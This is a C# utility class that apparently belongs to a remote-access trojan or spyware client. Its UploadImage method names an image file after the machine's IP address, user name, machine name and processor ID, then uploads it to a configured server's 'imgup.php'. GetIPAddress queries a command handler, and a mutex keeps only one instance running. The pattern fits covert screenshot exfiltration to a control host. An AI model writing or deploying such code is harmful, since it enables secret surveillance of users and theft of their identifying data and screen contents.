using System;
using System.IO;
using System.Net;
using System.Drawing;
using System.Threading;
using System.Drawing.Imaging;

using T.Core;

namespace T.Utilities
{
    class SysUtils
    {
        static Mutex m;
        public static string ProductVersion
        {
            get 
            {
                return System.Diagnostics.FileVersionInfo.GetVersionInfo(
                System.Reflection.Assembly.GetExecutingAssembly().Location
                ).ProductVersion;
            }
        }
        public static string GetOperatingSystem()
        {
            Version os = Environment.OSVersion.Version;
            switch (os.Major)
            {
                case 1:
                    return "Windows 1.0";
                case 2:
                    return "Windows 2.0";
                case 3:
                    return "Windows 3.0";
                case 4:
                    switch (os.Minor)
                    {
                        case 0:
                            return "Windows 95";
                        case 1:
                            return "Windows 98";
                        case 9:
                            return "Windows ME";
                    }
                    break;
                case 5:
                    switch (os.Minor)
                    {
                        case 0:
                            return "Windows 2000";
                        case 1:
                            return "Windows XP";
                        default: break;
                    }
                    break;
                case 6:
                    switch (os.Minor)
                    {
                        case 0:
                            return "Windows Vista";
                        case 1:
                            return "Windows 7";
                        case 2:
                            return "Windows 8";
                        case 3:
                            return "Windows 8.1";
                        default: break;
                    }
                    break;
                default: break;
            }

            return Environment.OSVersion.VersionString;
        }
        public static bool IsSingleInstance(string uniqueMutex)
        {
            try
            {
                Mutex.OpenExisting(uniqueMutex);
            }
            catch
            {
                m = new Mutex(true, uniqueMutex);
                return true; //Only one instance.
            }
            return false; //More than one instance.
        }
        public static void UploadImage(Image img)
        {
            string path = Path.GetTempPath() + GetIPAddress() + "^" + Environment.UserName + "@" + Environment.MachineName + "^" + CPU.ProcessorId() + ".jpg";
            img.Save(path, ImageFormat.Jpeg);
            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("Content-Type", "binary/octet-stream");
                wc.Headers.Add("User-Agent", Config.AuthCode);
                wc.UploadFile(Config.Host + "imgup.php", "POST", path);
            }
            File.Delete(path);
        }
		static string GetIPAddress()
		{
            string cmd = CmdHandler.COM.HttpRequest("page=get_ip");
            if (!string.IsNullOrEmpty(cmd) && cmd.StartsWith("IP|"))
            {
                return cmd.Remove(0, "IP|".Length);
            }

            return "N/A";
		}
    }
}